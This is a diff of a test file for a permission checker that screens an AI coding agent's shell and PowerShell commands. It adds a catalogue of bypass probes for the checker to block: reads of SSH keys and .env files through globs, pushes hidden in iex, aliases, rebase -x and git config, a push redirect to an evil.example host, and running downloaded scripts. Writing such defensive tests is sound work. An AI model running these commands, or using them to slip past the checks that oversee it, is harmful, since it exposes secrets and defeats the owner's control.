@@ -4,12 +4,12 @@
 // worktree on a feature branch under .claude/worktrees.
 import test from 'node:test';
 import assert from 'node:assert/strict';
-import { mkdirSync, writeFileSync, readFileSync } from 'node:fs';
+import { mkdirSync, writeFileSync, readFileSync, chmodSync } from 'node:fs';
 import { execFileSync } from 'node:child_process';
 import { join } from 'node:path';
-import { homedir } from 'node:os';
+import { homedir, tmpdir } from 'node:os';
 import { makeTmp } from './helpers/tmp.mjs';
-import { classify, mergeNeedsOwner, githubReadUrl } from '../lib/permission-rules.mjs';
+import { classify, mergeNeedsOwner, githubReadUrl, touchesSecrets } from '../lib/permission-rules.mjs';
 import { HubSettings, TIMEOUT_RAISED } from '../lib/settings.mjs';
 import { Agent } from '../lib/agent.mjs';
 import { Hub } from '../lib/hub.mjs';
@@ -167,8 +167,8 @@ test('4b. curl to a test hub on this machine, with a JS snippet in a shell varia
 test('4c. reading GitHub release and raw files (R005); anything else on the web is still the network', () => {
   // 6817a97d
   allow(proj, "curl -sL https://github.com/mshomper/crux/releases/latest/download/latest.json | head -c 400; echo; echo \"---\"; curl -sIL -o /dev/null -w 'installer: HTTP %{http_code}, %{size_download} bytes body, length %header{content-length}\\n' https://github.com/mshomper/crux/releases/download/v0.3.1/CruxHub_0.3.1_x64-setup.exe; gh release list --limit 3");
-  allow(proj, 'wget -q https://raw.githubusercontent.com/x/y/main/a.txt -O hub/a.txt');
-  allow(proj, `curl -sL -o "${T}/a.zip" https://github.com/x/y/releases/download/v1/a.zip`);
+  allow(proj, `mkdir -p "${T}/dl-own" && curl -sL -o "${T}/dl-own/a.zip" https://github.com/x/y/releases/download/v1/a.zip`);
+  allow(proj, `curl -sL -o "${T}/voice-build-dl/a.zip" https://github.com/x/y/releases/download/v1/a.zip`, 'Bash', { agent: 'voice-build' });
   matt(proj, 'curl -sL https://example.com/x.json');
   matt(proj, 'curl -sL https://github.com.evil.example/x');
   matt(proj, 'curl -sL https://github.com@evil.example/x');
@@ -294,7 +294,142 @@ test('the hub starts the checker in the folder the worker\'s tool call runs in (
     assert.equal(r.behavior, 'allow');
     assert.equal(p.log.ofType('approval').length, before);
     assert.match(p.log.ofType('permission_answer').at(-1).reason, /not fully readable/);
+    // a file it downloads in one request is still its download in the next: running it is a card
+    const dl = join(tmpdir(), 'voice-build-dl-probe', 'install.sh').replace(/\\/g, '/');
+    await hook({ hook_event_name: 'PreToolUse', tool_name: 'Bash', tool_input: {}, tool_use_id: 'tu-3', cwd: wt });
+    assert.equal((await hub.requestApproval(p, w, 'Bash', { command: `curl -sL -o "${dl}" https://raw.githubusercontent.com/x/y/main/install.sh` }, { toolUseID: 'tu-3' })).behavior, 'allow');
+    hub.requestApproval(p, w, 'Bash', { command: `bash "${dl}"` });
+    assert.match(p.log.ofType('approval').at(-1).stops.join(' '), /downloaded/);
   } finally {
     Object.assign(Agent.prototype, saved);
   }
+});
+
+// ---------- review of fix/permission-checker (checker-review, round 1): every probe that slipped through ----------
+
+test('R1 HIGH 1. a ( ) or @( ) argument in PowerShell is never a statement of its own', () => {
+  for (const c of ['git push origin @("main")', 'git push @("--force","origin","main")', 'git push origin ("main")', 'git @("branch","-D","main")',
+    'git push origin @( "main" )', 'Write-Output (git push origin main)', 'Write-Output (Set-Content C:\\x.txt 1)', "git push origin ('ma' + 'in')"]) matt(wt, c, ps);
+  assert.equal(notMatt(proj, "Get-ChildItem (Join-Path $env:TEMP 'x')", ps), 'unsure', 'an argument in brackets is not readable');
+  // statements that start with ( or @( read as before
+  allow(proj, "@(Get-CimInstance Win32_Process | Where-Object { $_.CommandLine -like '*x*' }).Count", ps);
+  allow(proj, '$n = @(Get-Process node -ErrorAction SilentlyContinue).Count; $n', ps);
+  allow(proj, "foreach ($n in 'a','b') { Write-Output $n }", ps);
+  allow(proj, "Get-ChildItem hub | Where-Object { $_.Length -gt 1 -and ($_.Name -like 'a*') } | Select-Object Name", ps);
+});
+
+test('R1 HIGH 2. reads after cd into ~/.crux-hub/voice are judged where they land', () => {
+  for (const c of ['cd ~/.crux-hub/voice && cat ../secret*', 'cd ~/.crux-hub/voice && grep -r . ..', 'cd ~/.crux-hub/voice && cat ../settings.json', 'cd ~/.crux-hub/voice/venv && cat ../../guard.json']) matt(proj, c);
+  matt(proj, 'Set-Location ~/.crux-hub/voice; Get-Content ../s*', ps);
+  matt(proj, 'Push-Location ~/.crux-hub/voice; Get-Content ..\\settings.json', ps);
+  matt(proj, 'Set-Location ~/.crux-hub/voice; Get-Content -Path:../settings.json', ps);
+  allow(proj, 'cd ~/.crux-hub/voice && cat ready.json && ls venv');
+  // the hub's quick read gate sends every one of these to the full check
+  for (const c of ['cd ~/.crux-hub/voice && cat ../settings.json', 'cat ~/.crux-hub/voice/ready.json', 'cd hub && cat ../.e*']) assert.equal(touchesSecrets('Bash', { command: c }, proj), true, c);
+  assert.equal(touchesSecrets('Read', { file_path: join(home, '.crux-hub', 'voice', 'ready.json') }), true);
+  assert.equal(touchesSecrets('Bash', { command: 'ls hub/*.txt' }, proj), false);
+});
+
+test('R1 HIGH 3. heads/main and refs/heads/main are main', () => {
+  for (const c of ['git push origin HEAD:heads/main', 'git push origin heads/main', 'git push origin HEAD:refs/heads//main', 'git push origin feat/voice:heads/master']) matt(wt, c);
+  allow(wt, 'git push origin HEAD:heads/feat/voice');
+});
+
+test('R1 HIGH 4. iex( ), Invoke-Expression( ) and script blocks made from text run that text', () => {
+  for (const c of ['iex("git push origin main")', 'Invoke-Expression("git push origin main")', '& ([scriptblock]::Create("git push origin main"))',
+    "iex ('git push ' + 'origin main')", '$ExecutionContext.InvokeCommand.InvokeScript("git push origin main")']) matt(wt, c, ps);
+  assert.equal(notMatt(wt, 'iex("Get-Date")', ps), 'unsure', 'never readable');
+  allow(wt, "'checked: no push needed'", ps);   // a string on its own is only printed
+});
+
+test('R1 MEDIUM 5. quoted text stays in the scan unless it is plainly text', () => {
+  for (const c of ["git -c alias.p='!git push origin main' p", 'npm pkg set scripts.x="git push origin main" && npm run x', "perl -e 'qx(git push origin main)'",
+    "ruby -e 'system(\"git push origin main\")'", 'schtasks /create /tn x /tr "git push origin main"', 'script -c "git push origin main"',
+    'nodemon --exec "git push origin main"', 'unknowntool "git push origin main"']) matt(wt, c);
+  notMatt(wt, 'echo "about to merge and push" && unknowntool x');
+  notMatt(wt, 'git commit -m "fix the merge before the push" && unknowntool x');
+  notMatt(wt, 'gh pr create --title "Merge the push fix" --body "x" && unknowntool x');
+});
+
+test('R1 MEDIUM 6. GitHub downloads land only in the agent\'s own temp folder, and are never run later', () => {
+  for (const c of ['curl -sL -o hub/a.zip https://github.com/x/y/releases/download/v1/a.zip', 'wget -q https://raw.githubusercontent.com/x/y/main/a.txt -O hub/a.txt',
+    `curl -sL -o "${T}/a.zip" https://github.com/x/y/releases/download/v1/a.zip`, `cd hub && curl -sLO https://github.com/x/y/releases/download/v1/a.zip`,
+    'curl -sL -H "Accept: application/octet-stream" https://github.com/x/y/releases/download/v1/a.zip', `mkdir -p "${T}/dl-a" && curl -sL -H "X: y" -o "${T}/dl-a/a" https://github.com/x/y/raw/main/a`]) matt(proj, c);
+  const first = run(proj, `mkdir -p "${T}/dl-run" && curl -sL -o "${T}/dl-run/install.sh" https://raw.githubusercontent.com/x/y/main/install.sh && curl -sL -o "${T}/dl-run/x.ps1" https://raw.githubusercontent.com/x/y/main/x.ps1`);
+  assert.equal(first.route, 'allow', why(first));
+  const later = { downloaded: first.downloaded, madeTemp: first.tempMade };
+  for (const c of [`bash "${T}/dl-run/install.sh"`, `sh ${T}/dl-run/install.sh`, `cd "${T}/dl-run" && ./install.sh`, `node "${T}/dl-run/install.sh"`, `python "${T}/dl-run/install.sh"`]) matt(proj, c, 'Bash', later);
+  for (const c of [`pwsh -File "${T}/dl-run/x.ps1"`, `& "${T}/dl-run/x.ps1"`, `. "${T}/dl-run/x.ps1"`]) matt(proj, c, ps, later);
+  allow(proj, `cat "${T}/dl-run/install.sh"`, 'Bash', later);   // reading it is fine
+});
+
+test('R1 MEDIUM 7. after something the hub could not read, the branch is unknown for a bare push or merge', () => {
+  for (const c of ['git -c core.x=y checkout main; git push', 'bash scripts/switch.sh && git push', 'sh hub/x.sh; git merge origin/main', './switch.sh && git push origin HEAD',
+    'echo $(git checkout main) && git push', 'unknowntool --branch main && git merge feat/x']) matt(wt, c);
+  matt(wt, 'pwsh -File scripts/x.ps1; git push', ps);
+  // a part that cannot switch branches keeps the branch known; explicit branches never needed it
+  assert.equal(notMatt(wt, 'git commit -q -m "v $(date +%s)" && git push'), 'unsure');
+  notMatt(wt, 'unknowntool x && git push -u origin feat/voice');
+  allow(wt, 'npm test && git push');
+});
+
+test('R1 MEDIUM 8. globs and {a,b} lists that reach a secret on disk', () => {
+  const fake = join(root, 'fakehome');
+  mkdirSync(join(fake, '.ssh'), { recursive: true });
+  writeFileSync(join(fake, '.ssh', 'id_rsa'), 'x');
+  const envDir = join(root, 'envdir');
+  mkdirSync(envDir, { recursive: true });
+  writeFileSync(join(envDir, '.env'), 'x');
+  writeFileSync(join(envDir, 'notes.txt'), 'x');
+  const h = { home: fake };
+  for (const c of ['cat ~/.ss*/id_*', 'cat ~/.s?h/*', 'cat ~/.{ssh,aws}/config', 'grep -r key ~/.[s]sh']) matt(proj, c, 'Bash', h);
+  for (const c of ['cat .en?', 'cat .e*', 'cat ./*env', 'head -1 *']) matt(envDir, c, 'Bash', h);
+  allow(envDir, 'cat *.txt', 'Bash', h);
+  allow(envDir, 'cat notes.tx?', 'Bash', h);
+  assert.equal(touchesSecrets('Bash', { command: 'cat .en?' }, envDir), true);
+  assert.equal(touchesSecrets('Bash', { command: 'cat *.txt' }, envDir), false);
+});
+
+test('R1 MEDIUM 9. git rebase -x reads its command; git settings that run programs are stops', () => {
+  for (const c of ['git rebase -x "git push origin main" origin/main', 'git rebase --exec="git push --force" main', 'git rebase -x "git branch -D main" main',
+    "git config core.pager \"sh -c 'git push origin main'\"", 'git config core.fsmonitor x', 'git config core.hooksPath .hooks', 'git config alias.co checkout',
+    'git config url.https://evil.example/.pushInsteadOf https://github.com/', 'git config push.default matching', 'git config --global user.name x']) matt(wt, c);
+  assert.equal(notMatt(wt, 'git config user.name x'), 'unsure');
+  allow(wt, 'git config --get user.name');
+  assert.equal(notMatt(wt, 'git rebase -x "npm test" origin/main'), 'unsure');
+});
+
+test('R1 LOW. pulls into main, pip writing files, the settings write and its notice', () => {
+  matt(proj, 'git pull origin feat/voice');
+  matt(proj, 'git pull --rebase origin feat/voice');
+  matt(wt, 'git pull origin feat/voice:main');
+  allow(proj, 'git pull');
+  allow(proj, 'git pull origin main');
+  allow(wt, 'git pull origin main');   // main into the feature branch
+  for (const c of ['pip list --log x.txt', 'pip freeze --cache-dir x', 'pip show x --log-file=y']) matt(proj, c);
+  // a settings file the hub cannot write: it still starts, with the raise for this run
+  const dir = makeTmp('crux-ro-settings-');
+  const file = join(dir, 'settings.json');
+  writeFileSync(file, JSON.stringify({ permissionTimeoutSec: 60 }));
+  chmodSync(file, 0o444);
+  try {
+    let s;
+    assert.doesNotThrow(() => { s = new HubSettings({ file }); });
+    assert.equal(s.get('permissionTimeoutSec'), 300);
+    assert.equal(s.timeoutRaisedFrom, 60);
+  } finally { chmodSync(file, 0o666); }
+  // and the hub says so once in each orchestrator thread
+  const hdir = makeTmp('crux-raise-notice-');
+  mkdirSync(join(hdir, 'a', '.crux'), { recursive: true });
+  mkdirSync(join(hdir, 'b', '.crux'), { recursive: true });
+  const sfile = join(hdir, 'settings.json');
+  writeFileSync(sfile, JSON.stringify({ permissionTimeoutSec: 60 }));
+  const hub = new Hub({ projects: [join(hdir, 'a'), join(hdir, 'b')], memory: new Memory(join(hdir, 'home')), settings: new HubSettings({ file: sfile }), noAgents: true });
+  for (const name of ['a', 'b']) {
+    const notes = hub.project(name).log.ofType('notice').filter(n => n.thread === 'orchestrator' && /Permission wait raised from 1 minute to 5 minutes \(decision 64\)/.test(n.text));
+    assert.equal(notes.length, 1, name);
+  }
+  const again = new Hub({ projects: [join(hdir, 'a')], memory: new Memory(join(hdir, 'home')), settings: new HubSettings({ file: sfile }), noAgents: true });
+  assert.equal(again.project('a').log.ofType('notice').filter(n => /Permission wait raised/.test(n.text)).length, 1, 'not again after a restart');
+  clearInterval(hub.idleTimer); clearInterval(again.idleTimer);
 });
